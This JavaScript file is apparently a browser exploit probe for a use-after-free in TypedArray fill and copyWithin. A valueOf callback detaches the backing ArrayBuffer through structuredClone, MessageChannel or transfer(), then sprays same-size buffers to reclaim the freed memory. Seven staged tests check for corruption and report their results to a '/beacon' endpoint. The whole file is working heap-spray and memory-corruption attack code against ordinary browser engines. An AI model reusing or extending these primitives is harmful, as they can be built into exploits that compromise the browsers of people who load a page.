/*
 * p417 -- UAF via structuredClone+transfer in fill/copyWithin valueOf
 * Bug: fill/copyWithin captures typedVector pointer and length BEFORE valueOf.
 *      valueOf detaches the ArrayBuffer via structuredClone(null, {transfer:[ab]}).
 *      structuredClone frees the backing store (unreferenced clone result).
 *      fill/memmove then uses stale pointer to freed memory.
 *      Spray same-size allocations in valueOf to reuse freed region.
 * Beacon prefix: V417-
 */
(function(){
"use strict";
var RUN = "v417-" + Math.random().toString(36).slice(2,8);
var BQ = 0;

function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V417-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT", RUN);

// Detach helper: tries structuredClone transfer, then MessageChannel, then ab.transfer()
function detach(ab) {
  // Method 1: structuredClone with transfer (frees backing store synchronously)
  try {
    structuredClone(null, {transfer: [ab]});
    return "clone";
  } catch(e) {}

  // Method 2: MessageChannel postMessage transfer
  try {
    var mc = new MessageChannel();
    mc.port1.postMessage("", [ab]);
    mc.port1.close();
    mc.port2.close();
    return "mc";
  } catch(e2) {}

  // Method 3: ab.transfer() (ES2024)
  try {
    if (typeof ab.transfer === "function") {
      ab.transfer();
      return "transfer";
    }
  } catch(e3) {}

  return null;
}

// T1: Can we detach an ArrayBuffer? Which method works?
function T1_detach_test() {
  var r = {};

  // structuredClone with transfer
  try {
    var a1 = new ArrayBuffer(64);
    r.scBefore = a1.byteLength;
    structuredClone(null, {transfer: [a1]});
    r.scAfter = a1.byteLength;
    r.scWorks = true;
  } catch(e) {
    r.scErr = e.constructor.name + ":" + String(e.message).slice(0,120);
    r.scWorks = false;
  }

  // MessageChannel transfer
  try {
    var a2 = new ArrayBuffer(64);
    r.mcBefore = a2.byteLength;
    var mc = new MessageChannel();
    mc.port1.postMessage("", [a2]);
    r.mcAfter = a2.byteLength;
    r.mcWorks = (a2.byteLength === 0);
    mc.port1.close();
    mc.port2.close();
  } catch(e) {
    r.mcErr = e.constructor.name + ":" + String(e.message).slice(0,120);
    r.mcWorks = false;
  }

  // ab.transfer()
  try {
    var a3 = new ArrayBuffer(64);
    r.hasTransfer = typeof a3.transfer === "function";
    if (r.hasTransfer) {
      a3.transfer();
      r.trAfter = a3.byteLength;
      r.trWorks = (a3.byteLength === 0);
    }
  } catch(e) {
    r.trErr = e.constructor.name + ":" + String(e.message).slice(0,120);
  }

  B("T1-DETACH", r);
  return r;
}

// T2: fill() survives after detach in value.valueOf?
function T2_fill_survives() {
  var r = {};
  try {
    var ab = new ArrayBuffer(256);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = 0x42;

    var dMethod = null;
    var survived = false;

    u8.fill({valueOf: function() {
      dMethod = detach(ab);
      return 0xEE;
    }});

    survived = true;
    r.survived = true;
    r.detachMethod = dMethod;
    r.postLen = ab.byteLength;
  } catch(e) {
    r.survived = false;
    r.err = e.constructor.name + ":" + String(e.message).slice(0,120);
  }
  B("T2-FILL", r);
  return r;
}

// T3: copyWithin() survives after detach in from.valueOf?
function T3_copy_survives() {
  var r = {};
  try {
    var ab = new ArrayBuffer(256);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = i & 0xFF;

    var dMethod = null;

    u8.copyWithin(0x40, {valueOf: function() {
      dMethod = detach(ab);
      return 0;
    }});

    r.survived = true;
    r.detachMethod = dMethod;
    r.postLen = ab.byteLength;
  } catch(e) {
    r.survived = false;
    r.err = e.constructor.name + ":" + String(e.message).slice(0,120);
  }
  B("T3-COPY", r);
  return r;
}

// T4: UAF fill -- detach + spray, check if spray buffer is overwritten
function T4_uaf_fill_spray() {
  var r = {};
  try {
    var SIZE = 256;
    var ab = new ArrayBuffer(SIZE);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < SIZE; i++) u8[i] = 0x42;

    var sprays = [];
    var sprayViews = [];
    var dMethod = null;

    u8.fill({valueOf: function() {
      dMethod = detach(ab);
      if (!dMethod) return 0;

      // Spray same-size allocations to reuse freed backing store
      for (var s = 0; s < 200; s++) {
        var sab = new ArrayBuffer(SIZE);
        var sv = new Uint8Array(sab);
        for (var j = 0; j < SIZE; j++) sv[j] = 0xCC;
        sprays.push(sab);
        sprayViews.push(sv);
      }

      return 0xEE; // fill with 0xEE
    }});

    r.detachMethod = dMethod;
    r.sprayCount = sprays.length;

    // Check which spray buffers were corrupted by the fill
    var hitCount = 0;
    var hitIdx = -1;
    var hitSample = null;
    for (var i = 0; i < sprayViews.length; i++) {
      var sv = sprayViews[i];
      var ee = 0;
      var cc = 0;
      var other = 0;
      for (var j = 0; j < SIZE; j++) {
        if (sv[j] === 0xEE) ee++;
        else if (sv[j] === 0xCC) cc++;
        else other++;
      }
      if (ee > 0) {
        hitCount++;
        if (hitIdx < 0) {
          hitIdx = i;
          hitSample = {idx: i, ee: ee, cc: cc, other: other};
          var bytes = [];
          for (var j = 0; j < 32; j++) bytes.push(sv[j].toString(16));
          hitSample.first32 = bytes.join(",");
        }
      }
    }

    r.hitCount = hitCount;
    r.hitIdx = hitIdx;
    r.hitSample = hitSample;

  } catch(e) {
    r.err = e.constructor.name + ":" + String(e.message).slice(0,120);
  }
  B("T4-FILL-SPRAY", r);
  return r;
}

// T5: UAF fill on 4KB buffer + spray
function T5_uaf_4k() {
  var r = {};
  try {
    var SIZE = 0x1000;
    var ab = new ArrayBuffer(SIZE);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < SIZE; i++) u8[i] = 0x42;

    var sprays = [];
    var sprayViews = [];
    var dMethod = null;

    u8.fill({valueOf: function() {
      dMethod = detach(ab);
      if (!dMethod) return 0;

      for (var s = 0; s < 100; s++) {
        var sab = new ArrayBuffer(SIZE);
        var sv = new Uint8Array(sab);
        for (var j = 0; j < SIZE; j++) sv[j] = 0xDD;
        sprays.push(sab);
        sprayViews.push(sv);
      }

      return 0xAA;
    }});

    r.detachMethod = dMethod;
    r.sprayCount = sprays.length;

    var hitCount = 0;
    var hitIdx = -1;
    for (var i = 0; i < sprayViews.length; i++) {
      var sv = sprayViews[i];
      var aa = 0;
      for (var j = 0; j < SIZE; j++) {
        if (sv[j] === 0xAA) aa++;
      }
      if (aa > 0) {
        hitCount++;
        if (hitIdx < 0) {
          hitIdx = i;
          r.aaBytes = aa;
          r.ddBytes = SIZE - aa;
          var bytes = [];
          for (var j = 0; j < 32; j++) bytes.push(sv[j].toString(16));
          r.sample = bytes.join(",");
        }
      }
    }

    r.hitCount = hitCount;
    r.hitIdx = hitIdx;

  } catch(e) {
    r.err = e.constructor.name + ":" + String(e.message).slice(0,120);
  }
  B("T5-4K-SPRAY", r);
  return r;
}

// T6: copyWithin UAF -- pre-load pattern, detach, spray, copy pattern over spray
function T6_uaf_copy_spray() {
  var r = {};
  try {
    var SIZE = 0x1000;
    var ab = new ArrayBuffer(SIZE);
    var u8 = new Uint8Array(ab);
    // Write a recognizable pattern in first half
    for (var i = 0; i < SIZE; i++) {
      u8[i] = (i < SIZE/2) ? 0x41 : 0x42;
    }

    var sprays = [];
    var sprayViews = [];
    var dMethod = null;

    // copyWithin(target=SIZE/2, from=poison_returns_0)
    // Copies first half (0x41) to second half, but after detach + spray,
    // the "first half" is now spray data and the "second half" is also spray data
    u8.copyWithin(SIZE/2, {valueOf: function() {
      dMethod = detach(ab);
      if (!dMethod) return 0;

      for (var s = 0; s < 100; s++) {
        var sab = new ArrayBuffer(SIZE);
        var sv = new Uint8Array(sab);
        for (var j = 0; j < SIZE; j++) sv[j] = 0xBB;
        sprays.push(sab);
        sprayViews.push(sv);
      }

      return 0;
    }});

    r.detachMethod = dMethod;
    r.sprayCount = sprays.length;

    // If a spray buffer reused the freed region:
    // memmove copied bytes 0..SIZE/2 to bytes SIZE/2..SIZE
    // Before memmove, the spray had 0xBB everywhere
    // memmove reads from [0, SIZE/2) (now 0xBB) and writes to [SIZE/2, SIZE)
    // Result: entire buffer is still 0xBB (self-copy of same value)
    // BUT: the copy happens AFTER spray filled with 0xBB, so if the
    // original buffer data (0x41) was still in the freed memory before spray...

    var hitCount = 0;
    for (var i = 0; i < sprayViews.length; i++) {
      var sv = sprayViews[i];
      var has41 = false;
      for (var j = 0; j < SIZE; j++) {
        if (sv[j] !== 0xBB) {
          has41 = true;
          break;
        }
      }
      if (has41) {
        hitCount++;
        if (hitCount === 1) {
          r.hitIdx = i;
          var bytes = [];
          for (var j = 0; j < 32; j++) bytes.push(sv[j].toString(16));
          r.sample = bytes.join(",");
        }
      }
    }
    r.hitCount = hitCount;

  } catch(e) {
    r.err = e.constructor.name + ":" + String(e.message).slice(0,120);
  }
  B("T6-COPY-SPRAY", r);
  return r;
}

// T7: RAB detach test -- can we detach a resizable ArrayBuffer?
function T7_rab_detach() {
  var r = {};
  try {
    var ab = new ArrayBuffer(256, {maxByteLength: 1024});
    r.rabBefore = ab.byteLength;
    r.maxBefore = ab.maxByteLength;
    var method = detach(ab);
    r.method = method;
    r.rabAfter = ab.byteLength;
    r.detached = (ab.byteLength === 0);
  } catch(e) {
    r.err = e.constructor.name + ":" + String(e.message).slice(0,120);
  }
  B("T7-RAB-DETACH", r);
  return r;
}

// Schedule
var tests = [T1_detach_test, T2_fill_survives, T3_copy_survives,
             T4_uaf_fill_spray, T5_uaf_4k, T6_uaf_copy_spray, T7_rab_detach];
var idx = 0;
function runNext() {
  if (idx >= tests.length) {
    B("Z", "v417-done");
    return;
  }
  var name = tests[idx].name || ("T" + idx);
  try { tests[idx](); }
  catch(e) { B("ERR", name + ":" + String(e.message).slice(0,200)); }
  idx++;
  setTimeout(runNext, 500);
}

setInterval(function() { B("HB", "hb"); }, 10000);
setTimeout(runNext, 200);
})();
